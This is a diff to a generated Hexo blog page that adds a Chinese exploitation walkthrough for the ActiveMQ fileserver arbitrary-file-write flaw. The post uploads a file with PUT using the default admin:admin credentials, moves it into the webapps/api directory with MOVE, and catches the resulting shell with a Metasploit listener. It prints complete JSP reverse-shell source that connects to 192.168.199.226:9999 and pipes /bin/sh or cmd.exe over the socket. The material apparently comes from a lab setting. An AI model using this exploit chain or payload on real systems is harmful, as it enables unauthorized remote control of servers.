+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/25/ld (2)/" itemprop="url">ActiveMQ任意文件写入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="ActiveMQ任意文件写入"><a href="#ActiveMQ任意文件写入" class="headerlink" title="ActiveMQ任意文件写入"></a>ActiveMQ任意文件写入</h1><p>背景<br>8161为web控制台端口，本漏洞就出现在web控制台中<br>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页<br>面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，<br>fileserver无需登录。<br>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中<br>存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件<br>的缺陷，但后来发现：其使用率并不高而且文件操作容易出现漏洞<br>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在<br>conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。<br>漏洞利用<br>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但<br>不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后<br>使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。<br>文件写入有几种利用方法：</p>
+<ol>
+<li>写入webshell</li>
+<li>写入cron或ssh key等文件</li>
+<li>写入jar或jetty.xml等库和配置文件<br>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api<br>两个应用都需要登录才能访问，所以有点鸡肋(但默认账号密码都是admin:admin)。写入<br>cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍<br>微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我<br>们需要知道activemq的绝对路径<br>写入webshell<br>写入webshell，需要写在admin或api应用中才能被解析，而这俩应用都需要登录才能访<br>问，默认账号密码为admin:admin，首先访问<a href="http://192.168.199.173:8161/admin/test/systemProperties.jsp，查看ActiveMQ的绝" target="_blank" rel="noopener">http://192.168.199.173:8161/admin/test/systemProperties.jsp，查看ActiveMQ的绝</a><br>对路径<br>&emsp;<br><a href="https://imgchr.com/i/mApALF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mApALF.png" alt="mApALF.png"></a><br>访问<a href="http://192.168.199.173:8161/fileserver/并用burp抓包，方便直接修改，改为PUT" target="_blank" rel="noopener">http://192.168.199.173:8161/fileserver/并用burp抓包，方便直接修改，改为PUT</a> 包，填写文件名，并且内容写入Cknife的jsp马，返回204即为成功<br>&lt;%@page import=”java.lang.*”%&gt;<br>&lt;%@page import=”java.util.*”%&gt;<br>&lt;%@page import=”java.io.*”%&gt;<br>&lt;%@page import=”java.net.*”%&gt;</li>
+</ol>
+<p>&lt;%<br>class StreamConnector extends Thread<br>{<br>InputStream sn;<br>OutputStream gy;</p>
+<p>StreamConnector( InputStream sn, OutputStream gy )<br>{<br>this.sn = sn;<br>this.gy = gy;<br>}</p>
+<p>public void run()<br>{<br>BufferedReader jy = null;<br>BufferedWriter qvo = null;<br>try<br>{<br>jy = new BufferedReader( new InputStreamReader( this.sn ) );<br>qvo = new BufferedWriter( new OutputStreamWriter( this.gy ) );<br>char buffer[] = new char[8192];<br>int length;<br>while( ( length = jy.read( buffer, 0, buffer.length ) ) &gt; 0 )<br>{<br>qvo.write( buffer, 0, length );<br>qvo.flush();<br>}<br>} catch( Exception e ){}<br>try<br>{<br>if( jy != null )<br>jy.close();<br>if( qvo != null )<br>qvo.close();<br>} catch( Exception e ){}<br>}<br>}</p>
+<p>try<br>{<br>String ShellPath;<br>if (System.getProperty(“os.name”).toLowerCase().indexOf(“windows”) == -1) {<br>ShellPath = new String(“/bin/sh”);<br>} else {<br>ShellPath = new String(“cmd.exe”);<br>}</p>
+<p>Socket socket = new Socket( “192.168.199.226”, 9999 );<br>Process process = Runtime.getRuntime().exec( ShellPath );<br>( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();<br>( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();<br>} catch( Exception e ) {}<br>%&gt;<br><a href="https://imgchr.com/i/mAp3LD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mAp3LD.png" alt="mAp3LD.png"></a><br>访问<a href="http://192.168.199.173:8161/api/" target="_blank" rel="noopener">http://192.168.199.173:8161/api/</a><br><a href="https://imgchr.com/i/mApwSP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mApwSP.png" alt="mApwSP.png"></a><br>移动到web目录下的api文件夹(/opt/activemq/webapps/api/3.jsp)中(admin目录下jsp也<br>可被解析)<br>Destination:file:///opt/activemq/webapps/api/3.jsp<br><a href="https://imgchr.com/i/mApseg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mApseg.png" alt="mApseg.png"></a><br>访问无报错则已经成功移动<br><a href="https://imgchr.com/i/mApomF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mApomF.png" alt="mApomF.png"></a><br>kali机器，msfconsole启动msf，使用监听模块/exploit/multi/hanlter进行监听，网页再<br>次访问：<br><a href="https://imgchr.com/i/mA9Mkj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9Mkj.png" alt="mA9Mkj.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mA9Qts" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9Qts.png" alt="mA9Qts.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (5)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1507,7 +1507,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
